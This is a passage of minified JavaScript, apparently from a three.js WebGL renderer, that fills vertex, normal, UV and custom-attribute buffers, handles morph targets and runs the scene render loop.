dW)}if(b5&&cO){for(cU=0,dF=cs.length;cU<dF;cU++){b3=dB[cs[cU]];ck=b3.vertexNormals;b8=b3.normal;if(ck.length===3&&cD){for(cT=0;cT<3;cT++){cw=ck[cT];du[cC]=cw.x;du[cC+1]=cw.y;du[cC+2]=cw.z;cC+=3}}else{for(cT=0;cT<3;cT++){du[cC]=b8.x;du[cC+1]=b8.y;du[cC+2]=b8.z;cC+=3}}}for(cU=0,dF=cq.length;cU<dF;cU++){b3=dB[cq[cU]];ck=b3.vertexNormals;b8=b3.normal;if(ck.length===4&&cD){for(cT=0;cT<4;cT++){cw=ck[cT];du[cC]=cw.x;du[cC+1]=cw.y;du[cC+2]=cw.z;cC+=3}}else{for(cT=0;cT<4;cT++){du[cC]=b8.x;du[cC+1]=b8.y;du[cC+2]=b8.z;cC+=3}}}c.bindBuffer(c.ARRAY_BUFFER,dm.__webglNormalBuffer);c.bufferData(c.ARRAY_BUFFER,du,dW)}if(c6&&c0&&dl){for(cU=0,dF=cs.length;cU<dF;cU++){dL=cs[cU];cM=c0[dL];if(cM===undefined){continue}for(cT=0;cT<3;cT++){de=cM[cT];cB[dp]=de.x;cB[dp+1]=de.y;dp+=2}}for(cU=0,dF=cq.length;cU<dF;cU++){dL=cq[cU];cM=c0[dL];if(cM===undefined){continue}for(cT=0;cT<4;cT++){de=cM[cT];cB[dp]=de.x;cB[dp+1]=de.y;dp+=2}}if(dp>0){c.bindBuffer(c.ARRAY_BUFFER,dm.__webglUVBuffer);c.bufferData(c.ARRAY_BUFFER,cB,dW)}}if(c6&&cz&&dl){for(cU=0,dF=cs.length;cU<dF;cU++){dL=cs[cU];dR=cz[dL];if(dR===undefined){continue}for(cT=0;cT<3;cT++){dk=dR[cT];cf[dP]=dk.x;cf[dP+1]=dk.y;dP+=2}}for(cU=0,dF=cq.length;cU<dF;cU++){dL=cq[cU];dR=cz[dL];if(dR===undefined){continue}for(cT=0;cT<4;cT++){dk=dR[cT];cf[dP]=dk.x;cf[dP+1]=dk.y;dP+=2}}if(dP>0){c.bindBuffer(c.ARRAY_BUFFER,dm.__webglUV2Buffer);c.bufferData(c.ARRAY_BUFFER,cf,dW)}}if(cW){for(cU=0,dF=cs.length;cU<dF;cU++){dN[cR]=ct;dN[cR+1]=ct+1;dN[cR+2]=ct+2;cR+=3;cX[c8]=ct;cX[c8+1]=ct+1;cX[c8+2]=ct;cX[c8+3]=ct+2;cX[c8+4]=ct+1;cX[c8+5]=ct+2;c8+=6;ct+=3}for(cU=0,dF=cq.length;cU<dF;cU++){dN[cR]=ct;dN[cR+1]=ct+1;dN[cR+2]=ct+3;dN[cR+3]=ct+1;dN[cR+4]=ct+2;dN[cR+5]=ct+3;cR+=6;cX[c8]=ct;cX[c8+1]=ct+1;cX[c8+2]=ct;cX[c8+3]=ct+3;cX[c8+4]=ct+1;cX[c8+5]=ct+2;cX[c8+6]=ct+2;cX[c8+7]=ct+3;c8+=8;ct+=4}c.bindBuffer(c.ELEMENT_ARRAY_BUFFER,dm.__webglFaceBuffer);c.bufferData(c.ELEMENT_ARRAY_BUFFER,dN,dW);c.bindBuffer(c.ELEMENT_ARRAY_BUFFER,dm.__webglLineBuffer);c.bufferData(c.ELEMENT_ARRAY_BUFFER,cX,dW)}if(cA){for(cT=0,cL=cA.length;cT<cL;cT++){b6=cA[cT];if(!b6.__original.needsUpdate){continue}ce=0;co=0;if(b6.size===1){if(b6.boundTo===undefined||b6.boundTo==="vertices"){for(cU=0,dF=cs.length;cU<dF;cU++){b3=dB[cs[cU]];b6.array[ce]=b6.value[b3.a];b6.array[ce+1]=b6.value[b3.b];b6.array[ce+2]=b6.value[b3.c];ce+=3}for(cU=0,dF=cq.length;cU<dF;cU++){b3=dB[cq[cU]];b6.array[ce]=b6.value[b3.a];b6.array[ce+1]=b6.value[b3.b];b6.array[ce+2]=b6.value[b3.c];b6.array[ce+3]=b6.value[b3.d];ce+=4}}else{if(b6.boundTo==="faces"){for(cU=0,dF=cs.length;cU<dF;cU++){cI=b6.value[cs[cU]];b6.array[ce]=cI;b6.array[ce+1]=cI;b6.array[ce+2]=cI;ce+=3}for(cU=0,dF=cq.length;cU<dF;cU++){cI=b6.value[cq[cU]];b6.array[ce]=cI;b6.array[ce+1]=cI;b6.array[ce+2]=cI;b6.array[ce+3]=cI;ce+=4}}}}else{if(b6.size===2){if(b6.boundTo===undefined||b6.boundTo==="vertices"){for(cU=0,dF=cs.length;cU<dF;cU++){b3=dB[cs[cU]];dc=b6.value[b3.a];db=b6.value[b3.b];da=b6.value[b3.c];b6.array[ce]=dc.x;b6.array[ce+1]=dc.y;b6.array[ce+2]=db.x;b6.array[ce+3]=db.y;b6.array[ce+4]=da.x;b6.array[ce+5]=da.y;ce+=6}for(cU=0,dF=cq.length;cU<dF;cU++){b3=dB[cq[cU]];dc=b6.value[b3.a];db=b6.value[b3.b];da=b6.value[b3.c];c9=b6.value[b3.d];b6.array[ce]=dc.x;b6.array[ce+1]=dc.y;b6.array[ce+2]=db.x;b6.array[ce+3]=db.y;b6.array[ce+4]=da.x;b6.array[ce+5]=da.y;b6.array[ce+6]=c9.x;b6.array[ce+7]=c9.y;ce+=8}}else{if(b6.boundTo==="faces"){for(cU=0,dF=cs.length;cU<dF;cU++){cI=b6.value[cs[cU]];dc=cI;db=cI;da=cI;b6.array[ce]=dc.x;b6.array[ce+1]=dc.y;b6.array[ce+2]=db.x;b6.array[ce+3]=db.y;b6.array[ce+4]=da.x;b6.array[ce+5]=da.y;ce+=6}for(cU=0,dF=cq.length;cU<dF;cU++){cI=b6.value[cq[cU]];dc=cI;db=cI;da=cI;c9=cI;b6.array[ce]=dc.x;b6.array[ce+1]=dc.y;b6.array[ce+2]=db.x;b6.array[ce+3]=db.y;b6.array[ce+4]=da.x;b6.array[ce+5]=da.y;b6.array[ce+6]=c9.x;b6.array[ce+7]=c9.y;ce+=8}}}}else{if(b6.size===3){var cu;if(b6.type==="c"){cu=["r","g","b"]}else{cu=["x","y","z"]}if(b6.boundTo===undefined||b6.boundTo==="vertices"){for(cU=0,dF=cs.length;cU<dF;cU++){b3=dB[cs[cU]];dc=b6.value[b3.a];db=b6.value[b3.b];da=b6.value[b3.c];b6.array[ce]=dc[cu[0]];b6.array[ce+1]=dc[cu[1]];b6.array[ce+2]=dc[cu[2]];b6.array[ce+3]=db[cu[0]];b6.array[ce+4]=db[cu[1]];b6.array[ce+5]=db[cu[2]];b6.array[ce+6]=da[cu[0]];b6.array[ce+7]=da[cu[1]];b6.array[ce+8]=da[cu[2]];ce+=9}for(cU=0,dF=cq.length;cU<dF;cU++){b3=dB[cq[cU]];dc=b6.value[b3.a];db=b6.value[b3.b];da=b6.value[b3.c];c9=b6.value[b3.d];b6.array[ce]=dc[cu[0]];b6.array[ce+1]=dc[cu[1]];b6.array[ce+2]=dc[cu[2]];b6.array[ce+3]=db[cu[0]];b6.array[ce+4]=db[cu[1]];b6.array[ce+5]=db[cu[2]];b6.array[ce+6]=da[cu[0]];b6.array[ce+7]=da[cu[1]];b6.array[ce+8]=da[cu[2]];b6.array[ce+9]=c9[cu[0]];b6.array[ce+10]=c9[cu[1]];b6.array[ce+11]=c9[cu[2]];ce+=12}}else{if(b6.boundTo==="faces"){for(cU=0,dF=cs.length;cU<dF;cU++){cI=b6.value[cs[cU]];dc=cI;db=cI;da=cI;b6.array[ce]=dc[cu[0]];b6.array[ce+1]=dc[cu[1]];b6.array[ce+2]=dc[cu[2]];b6.array[ce+3]=db[cu[0]];b6.array[ce+4]=db[cu[1]];b6.array[ce+5]=db[cu[2]];b6.array[ce+6]=da[cu[0]];b6.array[ce+7]=da[cu[1]];b6.array[ce+8]=da[cu[2]];ce+=9}for(cU=0,dF=cq.length;cU<dF;cU++){cI=b6.value[cq[cU]];dc=cI;db=cI;da=cI;c9=cI;b6.array[ce]=dc[cu[0]];b6.array[ce+1]=dc[cu[1]];b6.array[ce+2]=dc[cu[2]];b6.array[ce+3]=db[cu[0]];b6.array[ce+4]=db[cu[1]];b6.array[ce+5]=db[cu[2]];b6.array[ce+6]=da[cu[0]];b6.array[ce+7]=da[cu[1]];b6.array[ce+8]=da[cu[2]];b6.array[ce+9]=c9[cu[0]];b6.array[ce+10]=c9[cu[1]];b6.array[ce+11]=c9[cu[2]];ce+=12}}else{if(b6.boundTo==="faceVertices"){for(cU=0,dF=cs.length;cU<dF;cU++){cI=b6.value[cs[cU]];dc=cI[0];db=cI[1];da=cI[2];b6.array[ce]=dc[cu[0]];b6.array[ce+1]=dc[cu[1]];b6.array[ce+2]=dc[cu[2]];b6.array[ce+3]=db[cu[0]];b6.array[ce+4]=db[cu[1]];b6.array[ce+5]=db[cu[2]];b6.array[ce+6]=da[cu[0]];b6.array[ce+7]=da[cu[1]];b6.array[ce+8]=da[cu[2]];ce+=9}for(cU=0,dF=cq.length;cU<dF;cU++){cI=b6.value[cq[cU]];dc=cI[0];db=cI[1];da=cI[2];c9=cI[3];b6.array[ce]=dc[cu[0]];b6.array[ce+1]=dc[cu[1]];b6.array[ce+2]=dc[cu[2]];b6.array[ce+3]=db[cu[0]];b6.array[ce+4]=db[cu[1]];b6.array[ce+5]=db[cu[2]];b6.array[ce+6]=da[cu[0]];b6.array[ce+7]=da[cu[1]];b6.array[ce+8]=da[cu[2]];b6.array[ce+9]=c9[cu[0]];b6.array[ce+10]=c9[cu[1]];b6.array[ce+11]=c9[cu[2]];ce+=12}}}}}else{if(b6.size===4){if(b6.boundTo===undefined||b6.boundTo==="vertices"){for(cU=0,dF=cs.length;cU<dF;cU++){b3=dB[cs[cU]];dc=b6.value[b3.a];db=b6.value[b3.b];da=b6.value[b3.c];b6.array[ce]=dc.x;b6.array[ce+1]=dc.y;b6.array[ce+2]=dc.z;b6.array[ce+3]=dc.w;b6.array[ce+4]=db.x;b6.array[ce+5]=db.y;b6.array[ce+6]=db.z;b6.array[ce+7]=db.w;b6.array[ce+8]=da.x;b6.array[ce+9]=da.y;b6.array[ce+10]=da.z;b6.array[ce+11]=da.w;ce+=12}for(cU=0,dF=cq.length;cU<dF;cU++){b3=dB[cq[cU]];dc=b6.value[b3.a];db=b6.value[b3.b];da=b6.value[b3.c];c9=b6.value[b3.d];b6.array[ce]=dc.x;b6.array[ce+1]=dc.y;b6.array[ce+2]=dc.z;b6.array[ce+3]=dc.w;b6.array[ce+4]=db.x;b6.array[ce+5]=db.y;b6.array[ce+6]=db.z;b6.array[ce+7]=db.w;b6.array[ce+8]=da.x;b6.array[ce+9]=da.y;b6.array[ce+10]=da.z;b6.array[ce+11]=da.w;b6.array[ce+12]=c9.x;b6.array[ce+13]=c9.y;b6.array[ce+14]=c9.z;b6.array[ce+15]=c9.w;ce+=16}}else{if(b6.boundTo==="faces"){for(cU=0,dF=cs.length;cU<dF;cU++){cI=b6.value[cs[cU]];dc=cI;db=cI;da=cI;b6.array[ce]=dc.x;b6.array[ce+1]=dc.y;b6.array[ce+2]=dc.z;b6.array[ce+3]=dc.w;b6.array[ce+4]=db.x;b6.array[ce+5]=db.y;b6.array[ce+6]=db.z;b6.array[ce+7]=db.w;b6.array[ce+8]=da.x;b6.array[ce+9]=da.y;b6.array[ce+10]=da.z;b6.array[ce+11]=da.w;ce+=12}for(cU=0,dF=cq.length;cU<dF;cU++){cI=b6.value[cq[cU]];dc=cI;db=cI;da=cI;c9=cI;b6.array[ce]=dc.x;b6.array[ce+1]=dc.y;b6.array[ce+2]=dc.z;b6.array[ce+3]=dc.w;b6.array[ce+4]=db.x;b6.array[ce+5]=db.y;b6.array[ce+6]=db.z;b6.array[ce+7]=db.w;b6.array[ce+8]=da.x;b6.array[ce+9]=da.y;b6.array[ce+10]=da.z;b6.array[ce+11]=da.w;b6.array[ce+12]=c9.x;b6.array[ce+13]=c9.y;b6.array[ce+14]=c9.z;b6.array[ce+15]=c9.w;ce+=16}}else{if(b6.boundTo==="faceVertices"){for(cU=0,dF=cs.length;cU<dF;cU++){cI=b6.value[cs[cU]];dc=cI[0];db=cI[1];da=cI[2];b6.array[ce]=dc.x;b6.array[ce+1]=dc.y;b6.array[ce+2]=dc.z;b6.array[ce+3]=dc.w;b6.array[ce+4]=db.x;b6.array[ce+5]=db.y;b6.array[ce+6]=db.z;b6.array[ce+7]=db.w;b6.array[ce+8]=da.x;b6.array[ce+9]=da.y;b6.array[ce+10]=da.z;b6.array[ce+11]=da.w;ce+=12}for(cU=0,dF=cq.length;cU<dF;cU++){cI=b6.value[cq[cU]];dc=cI[0];db=cI[1];da=cI[2];c9=cI[3];b6.array[ce]=dc.x;b6.array[ce+1]=dc.y;b6.array[ce+2]=dc.z;b6.array[ce+3]=dc.w;b6.array[ce+4]=db.x;b6.array[ce+5]=db.y;b6.array[ce+6]=db.z;b6.array[ce+7]=db.w;b6.array[ce+8]=da.x;b6.array[ce+9]=da.y;b6.array[ce+10]=da.z;b6.array[ce+11]=da.w;b6.array[ce+12]=c9.x;b6.array[ce+13]=c9.y;b6.array[ce+14]=c9.z;b6.array[ce+15]=c9.w;ce+=16}}}}}}}}c.bindBuffer(c.ARRAY_BUFFER,b6.buffer);c.bufferData(c.ARRAY_BUFFER,b6.array,dW)}}if(cg){delete dm.__inittedArrays;delete dm.__colorArray;delete dm.__normalArray;delete dm.__tangentArray;delete dm.__uvArray;delete dm.__uv2Array;delete dm.__faceArray;delete dm.__vertexArray;delete dm.__lineArray;delete dm.__skinIndexArray;delete dm.__skinWeightArray}}function ay(b7,b6,b5){var b2=b7.attributes;var b3,b4;for(b3 in b2){b4=b2[b3];if(b4.needsUpdate){if(b3==="index"){c.bindBuffer(c.ELEMENT_ARRAY_BUFFER,b4.buffer);c.bufferData(c.ELEMENT_ARRAY_BUFFER,b4.array,b6)}else{c.bindBuffer(c.ARRAY_BUFFER,b4.buffer);c.bufferData(c.ARRAY_BUFFER,b4.array,b6)}b4.needsUpdate=false}if(b5&&!b4.dynamic){delete b4.array}}}this.renderBufferImmediate=function(ch,b5,b7){if(ch.hasPositions&&!ch.__webglVertexBuffer){ch.__webglVertexBuffer=c.createBuffer()}if(ch.hasNormals&&!ch.__webglNormalBuffer){ch.__webglNormalBuffer=c.createBuffer()}if(ch.hasUvs&&!ch.__webglUvBuffer){ch.__webglUvBuffer=c.createBuffer()}if(ch.hasColors&&!ch.__webglColorBuffer){ch.__webglColorBuffer=c.createBuffer()}if(ch.hasPositions){c.bindBuffer(c.ARRAY_BUFFER,ch.__webglVertexBuffer);c.bufferData(c.ARRAY_BUFFER,ch.positionArray,c.DYNAMIC_DRAW);c.enableVertexAttribArray(b5.attributes.position);c.vertexAttribPointer(b5.attributes.position,3,c.FLOAT,false,0,0)}if(ch.hasNormals){c.bindBuffer(c.ARRAY_BUFFER,ch.__webglNormalBuffer);if(b7.shading===THREE.FlatShading){var cf,ce,cc,b4,ca,cj,b3,b9,ci,b2,b8,cg,cd,cb,b6=ch.count*3;for(cb=0;cb<b6;cb+=9){cd=ch.normalArray;b4=cd[cb];b3=cd[cb+1];b2=cd[cb+2];ca=cd[cb+3];b9=cd[cb+4];b8=cd[cb+5];cj=cd[cb+6];ci=cd[cb+7];cg=cd[cb+8];cf=(b4+ca+cj)/3;ce=(b3+b9+ci)/3;cc=(b2+b8+cg)/3;cd[cb]=cf;cd[cb+1]=ce;cd[cb+2]=cc;cd[cb+3]=cf;cd[cb+4]=ce;cd[cb+5]=cc;cd[cb+6]=cf;cd[cb+7]=ce;cd[cb+8]=cc}}c.bufferData(c.ARRAY_BUFFER,ch.normalArray,c.DYNAMIC_DRAW);c.enableVertexAttribArray(b5.attributes.normal);c.vertexAttribPointer(b5.attributes.normal,3,c.FLOAT,false,0,0)}if(ch.hasUvs&&b7.map){c.bindBuffer(c.ARRAY_BUFFER,ch.__webglUvBuffer);c.bufferData(c.ARRAY_BUFFER,ch.uvArray,c.DYNAMIC_DRAW);c.enableVertexAttribArray(b5.attributes.uv);c.vertexAttribPointer(b5.attributes.uv,2,c.FLOAT,false,0,0)}if(ch.hasColors&&b7.vertexColors!==THREE.NoColors){c.bindBuffer(c.ARRAY_BUFFER,ch.__webglColorBuffer);c.bufferData(c.ARRAY_BUFFER,ch.colorArray,c.DYNAMIC_DRAW);c.enableVertexAttribArray(b5.attributes.color);c.vertexAttribPointer(b5.attributes.color,3,c.FLOAT,false,0,0)}c.drawArrays(c.TRIANGLES,0,ch.count);ch.count=0};this.renderBufferDirect=function(ck,cp,b2,cc,b5,cr){if(cc.visible===false){return}var b9,cm,cj,cl,co,cd,b7;var cb,ce,cf,b3;b9=aR(ck,cp,b2,cc,cr);cm=b9.attributes;b7=b5.attributes;var cg=false,ci=cc.wireframe?1:0,cn=(b5.id*16777215)+(b9.id*2)+ci;if(cn!==D){D=cn;cg=true}if(cg){bz()}if(cr instanceof THREE.Mesh){var b8=b7.index;if(b8){var b6=b5.offsets;if(b6.length>1){cg=true}for(var ch=0,ca=b6.length;ch<ca;ch++){var b4=b6[ch].index;if(cg){for(ce in b7){if(ce==="index"){continue}cf=cm[ce];cb=b7[ce];b3=cb.itemSize;if(cf>=0){c.bindBuffer(c.ARRAY_BUFFER,cb.buffer);aj(cf);c.vertexAttribPointer(cf,b3,c.FLOAT,false,0,b4*b3*4)}}c.bindBuffer(c.ELEMENT_ARRAY_BUFFER,b8.buffer)}c.drawElements(c.TRIANGLES,b6[ch].count,c.UNSIGNED_SHORT,b6[ch].start*2);aP.info.render.calls++;aP.info.render.vertices+=b6[ch].count;aP.info.render.faces+=b6[ch].count/3}}else{if(cg){for(ce in b7){if(ce==="index"){continue}cf=cm[ce];cb=b7[ce];b3=cb.itemSize;if(cf>=0){c.bindBuffer(c.ARRAY_BUFFER,cb.buffer);aj(cf);c.vertexAttribPointer(cf,b3,c.FLOAT,false,0,0)}}}var cq=b5.attributes.position;c.drawArrays(c.TRIANGLES,0,cq.numItems/3);aP.info.render.calls++;aP.info.render.vertices+=cq.numItems/3;aP.info.render.faces+=cq.numItems/3/3}}else{if(cr instanceof THREE.ParticleSystem){if(cg){for(ce in b7){cf=cm[ce];cb=b7[ce];b3=cb.itemSize;if(cf>=0){c.bindBuffer(c.ARRAY_BUFFER,cb.buffer);aj(cf);c.vertexAttribPointer(cf,b3,c.FLOAT,false,0,0)}}var cq=b7.position;c.drawArrays(c.POINTS,0,cq.numItems/3);aP.info.render.calls++;aP.info.render.points+=cq.numItems/3}}else{if(cr instanceof THREE.Line){if(cg){for(ce in b7){cf=cm[ce];cb=b7[ce];b3=cb.itemSize;if(cf>=0){c.bindBuffer(c.ARRAY_BUFFER,cb.buffer);aj(cf);c.vertexAttribPointer(cf,b3,c.FLOAT,false,0,0)}}aJ(cc.linewidth);var cq=b7.position;c.drawArrays(c.LINE_STRIP,0,cq.numItems/3);aP.info.render.calls++;aP.info.render.points+=cq.numItems}}}}};this.renderBuffer=function(cc,b8,b2,cd,b6,b5){if(cd.visible===false){return}var cb,b9,cf,ci,ch,b3,ca,cg;cb=aR(cc,b8,b2,cd,b5);b9=cb.attributes;var b4=false,ce=cd.wireframe?1:0,b7=(b6.id*16777215)+(cb.id*2)+ce;if(b7!==D){D=b7;b4=true}if(b4){bz()}if(!cd.morphTargets&&b9.position>=0){if(b4){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglVertexBuffer);aj(b9.position);c.vertexAttribPointer(b9.position,3,c.FLOAT,false,0,0)}}else{if(b5.morphTargetBase){y(cd,b6,b5)}}if(b4){if(b6.__webglCustomAttributesList){for(ca=0,cg=b6.__webglCustomAttributesList.length;ca<cg;ca++){b3=b6.__webglCustomAttributesList[ca];if(b9[b3.buffer.belongsToAttribute]>=0){c.bindBuffer(c.ARRAY_BUFFER,b3.buffer);aj(b9[b3.buffer.belongsToAttribute]);c.vertexAttribPointer(b9[b3.buffer.belongsToAttribute],b3.size,c.FLOAT,false,0,0)}}}if(b9.color>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglColorBuffer);aj(b9.color);c.vertexAttribPointer(b9.color,3,c.FLOAT,false,0,0)}if(b9.normal>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglNormalBuffer);aj(b9.normal);c.vertexAttribPointer(b9.normal,3,c.FLOAT,false,0,0)}if(b9.tangent>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglTangentBuffer);aj(b9.tangent);c.vertexAttribPointer(b9.tangent,4,c.FLOAT,false,0,0)}if(b9.uv>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglUVBuffer);aj(b9.uv);c.vertexAttribPointer(b9.uv,2,c.FLOAT,false,0,0)}if(b9.uv2>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglUV2Buffer);aj(b9.uv2);c.vertexAttribPointer(b9.uv2,2,c.FLOAT,false,0,0)}if(cd.skinning&&b9.skinIndex>=0&&b9.skinWeight>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglSkinIndicesBuffer);aj(b9.skinIndex);c.vertexAttribPointer(b9.skinIndex,4,c.FLOAT,false,0,0);c.bindBuffer(c.ARRAY_BUFFER,b6.__webglSkinWeightsBuffer);aj(b9.skinWeight);c.vertexAttribPointer(b9.skinWeight,4,c.FLOAT,false,0,0)}if(b9.lineDistance>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglLineDistanceBuffer);aj(b9.lineDistance);c.vertexAttribPointer(b9.lineDistance,1,c.FLOAT,false,0,0)}}if(b5 instanceof THREE.Mesh){if(cd.wireframe){aJ(cd.wireframeLinewidth);if(b4){c.bindBuffer(c.ELEMENT_ARRAY_BUFFER,b6.__webglLineBuffer)}c.drawElements(c.LINES,b6.__webglLineCount,c.UNSIGNED_SHORT,0)}else{if(b4){c.bindBuffer(c.ELEMENT_ARRAY_BUFFER,b6.__webglFaceBuffer)}c.drawElements(c.TRIANGLES,b6.__webglFaceCount,c.UNSIGNED_SHORT,0)}aP.info.render.calls++;aP.info.render.vertices+=b6.__webglFaceCount;aP.info.render.faces+=b6.__webglFaceCount/3}else{if(b5 instanceof THREE.Line){ci=(b5.type===THREE.LineStrip)?c.LINE_STRIP:c.LINES;aJ(cd.linewidth);c.drawArrays(ci,0,b6.__webglLineCount);aP.info.render.calls++}else{if(b5 instanceof THREE.ParticleSystem){c.drawArrays(c.POINTS,0,b6.__webglParticleCount);aP.info.render.calls++;aP.info.render.points+=b6.__webglParticleCount}else{if(b5 instanceof THREE.Ribbon){c.drawArrays(c.TRIANGLE_STRIP,0,b6.__webglVertexCount);aP.info.render.calls++}}}}};function aj(b2){if(!L[b2]){c.enableVertexAttribArray(b2);L[b2]=true}}function bz(){for(var b2 in L){if(L[b2]){c.disableVertexAttribArray(b2);L[b2]=false}}}function y(ca,b6,b5){var b8=ca.program.attributes;if(b5.morphTargetBase!==-1&&b8.position>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglMorphTargetsBuffers[b5.morphTargetBase]);aj(b8.position);c.vertexAttribPointer(b8.position,3,c.FLOAT,false,0,0)}else{if(b8.position>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglVertexBuffer);aj(b8.position);c.vertexAttribPointer(b8.position,3,c.FLOAT,false,0,0)}}if(b5.morphTargetForcedOrder.length){var b2=0;var b3=b5.morphTargetForcedOrder;var cc=b5.morphTargetInfluences;while(b2<ca.numSupportedMorphTargets&&b2<b3.length){if(b8["morphTarget"+b2]>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglMorphTargetsBuffers[b3[b2]]);aj(b8["morphTarget"+b2]);c.vertexAttribPointer(b8["morphTarget"+b2],3,c.FLOAT,false,0,0)}if(b8["morphNormal"+b2]>=0&&ca.morphNormals){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglMorphNormalsBuffers[b3[b2]]);aj(b8["morphNormal"+b2]);c.vertexAttribPointer(b8["morphNormal"+b2],3,c.FLOAT,false,0,0)}b5.__webglMorphTargetInfluences[b2]=cc[b3[b2]];b2++}}else{var cb,b4=[];var cc=b5.morphTargetInfluences;var b9,cd=cc.length;for(b9=0;b9<cd;b9++){cb=cc[b9];if(cb>0){b4.push([cb,b9])}}if(b4.length>ca.numSupportedMorphTargets){b4.sort(ab);b4.length=ca.numSupportedMorphTargets}else{if(b4.length>ca.numSupportedMorphNormals){b4.sort(ab)}else{if(b4.length===0){b4.push([0,0])}}}var b7,b2=0;while(b2<ca.numSupportedMorphTargets){if(b4[b2]){b7=b4[b2][1];if(b8["morphTarget"+b2]>=0){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglMorphTargetsBuffers[b7]);aj(b8["morphTarget"+b2]);c.vertexAttribPointer(b8["morphTarget"+b2],3,c.FLOAT,false,0,0)}if(b8["morphNormal"+b2]>=0&&ca.morphNormals){c.bindBuffer(c.ARRAY_BUFFER,b6.__webglMorphNormalsBuffers[b7]);aj(b8["morphNormal"+b2]);c.vertexAttribPointer(b8["morphNormal"+b2],3,c.FLOAT,false,0,0)}b5.__webglMorphTargetInfluences[b2]=cc[b7]}else{b5.__webglMorphTargetInfluences[b2]=0}b2++}}if(ca.program.uniforms.morphTargetInfluences!==null){c.uniform1fv(ca.program.uniforms.morphTargetInfluences,b5.__webglMorphTargetInfluences)}}function aI(b3,b2){if(b3.z!==b2.z){return b2.z-b3.z}else{return b3.id-b2.id}}function ab(b3,b2){return b2[0]-b3[0]}this.render=function(b8,cc,b9,ca){if(cc instanceof THREE.Camera===false){console.error("THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.");return}var b6,cd,b7,b4,b2,b5=b8.__lights,b3=b8.fog;a3=-1;b1=true;if(b8.autoUpdate===true){b8.updateMatrixWorld()}if(cc.parent===undefined){cc.updateMatrixWorld()}cc.matrixWorldInverse.getInverse(cc.matrixWorld);a1.multiplyMatrices(cc.projectionMatrix,cc.matrixWorldInverse);bu.setFromMatrix(a1);if(this.autoUpdateObjects){this.initWebGLObjects(b8)}r(this.renderPluginsPre,b8,cc);aP.info.render.calls=0;aP.info.render.vertices=0;aP.info.render.faces=0;aP.info.render.points=0;this.setRenderTarget(b9);if(this.autoClear||ca){this.clear(this.autoClearColor,this.autoClearDepth,this.autoClearStencil)}b2=b8.__webglObjects;for(b6=0,cd=b2.length;b6<cd;b6++){b7=b2[b6];b4=b7.object;b7.id=b6;b7.render=false;if(b4.visible){if(!(b4 instanceof THREE.Mesh||b4 instanceof THREE.ParticleSystem)||!(b4.frustumCulled)||bu.intersectsObject(b4)){bi(b4,cc);aq(b7);b7.render=true;if(this.sortObjects===true){if(b4.renderDepth!==null){b7.z=b4.renderDepth}else{V.getPositionFromMatrix(b4.matrixWorld);V.applyProjection(a1);b7.z=V.z}}}}}if(this.sortObjects){b2.sort(aI)}b2=b8.__webglObjectsImmediate;for(b6=0,cd=b2.length;b6<cd;b6++){b7=b2[b6];b4=b7.object;if(b4.visible){bi(b4,cc);aT(b7)}}if(b8.overrideMaterial){var cb=b8.overrideMaterial;this.setBlending(cb.blending,cb.blendEquation,cb.blendSrc,cb.blendDst);this.setDepthTest(cb.depthTest);this.setDepthWrite(cb.depthWrite);bY(cb.polygonOffset,cb.polygonOffsetFactor,cb.polygonOffsetUnits);bx(b8.__webglObjects,false,"",cc,b5,b3,true,cb);bM(b8.__webglObjectsImmediate,"",cc,b5,b3,false,cb)}else{var cb=null;this.setBlending(THREE.NoBlending);bx(b8.__webglObjects,true,"opaque",cc,b5,b3,false,cb);bM(b8.__webglObjectsImmediate,"opaque",cc,b5,b3,false,cb);bx(b8.__webglObjects,false,"transparent",cc,b5,b3,true,cb);bM(b8.__webglObjectsImmediate,"transparent",cc,b5,b3,true,cb)}r(this.renderPluginsPost,b8,cc);if(b9&&b9.generateMipmaps&&b9.minFilter!==THREE.NearestFilter&&b9.minFilter!==THREE.LinearFilter){aY(b9)}this.setDepthTest(true);this.setDepthWrite(true)};function r(b2,b6,b5){if(!b2.length){return}for(var b4=0,b3=b2.length;b4<b3;b4++){an=null;aM=null;k=-1;a=-1;bA=-1;bm=-1;m=-1;D=-1;a3=-1;b1=true;b2[b4].render(b6,b5,B,aV);an=null;aM=null;k=-1;a=-1;bA=-1;bm=-1;m=-1;D=-1;a3=-1;b1=true}}function bx(b2,cf,cb,ce,b8,b3,cc,cg){var ca,b6,b7,cd,b4,b5,ch;if(cf){b4=b2.length-1;b5=-1;ch=-1}else{b4=0;b5=b2.length;ch=1}for(var b9=b4;b9!==b5;b9+=ch){ca=b2[b9];if(ca.render){b6=ca.object;b7=ca.buffer;if(cg){cd=cg}else{cd=ca[cb];if(!cd){continue}if(cc){aP.setBlending(cd.blending,cd.blendEquation,cd.blendSrc,cd.blendDst)}aP.setDepthTest(cd.depthTest);aP.setDepthWrite(cd.depthWrite);bY(cd.polygonOffset,cd.polygonOffsetFactor,cd.polygonOffsetUnits)}aP.setMaterialFaces(cd);if(b7 instanceof THREE.BufferGeometry){aP.renderBufferDirect(ce,b8,b3,cd,b7,b6)}else{aP.renderBuffer(ce,b8,b3,cd,b7,b6)}}}}function bM(b2,b9,cc,b5,b3,ca,cd){var b8,b4,cb,b7;for(var b6=0,ce=b2.length;b6<ce;b6++){b8=b2[b6];b4=b8.object;if(b4.visible){if(cd){cb=cd}else{cb=b8[b9];if(!cb){continue}if(ca){aP.setBlending(cb.blending,cb.blendEquation,cb.blendSrc,cb.blendDst)}aP.setDepthTest(cb.depthTest);aP.setDepthWrite(cb.depthWrite);bY(cb.polygonOffset,cb.polygonOffsetFactor,cb.polygonOffsetUnits)}aP.renderImmediateObject(cc,b5,b3,cb,b4)}}}this.renderImmediateObject=function(b6,b4,b7,b5,b3){var 